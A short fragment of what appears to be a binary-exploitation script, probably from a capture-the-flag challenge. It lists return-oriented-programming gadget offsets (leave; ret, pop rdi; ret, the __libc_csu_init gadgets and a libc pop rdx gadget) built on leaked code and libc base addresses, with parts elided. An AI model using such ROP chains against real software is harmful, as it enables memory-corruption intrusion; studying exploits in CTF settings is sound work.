...
retn = codebase + 0x6c6
leave_ret = codebase + 0x911 #leave; ret
prdi_ret = codebase + 0xa13 #pop rdi ; ret
csu_init_gadget2 = codebase + 0xa0a
'''
pop rbx
pop rbp
pop r12
...
retn
'''
csu_init_gadget1 = codebase + 0x9f0
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
...
prdx_ret = libcbase + 0x130514 #pop rdx ; pop r10|r12 ; ret
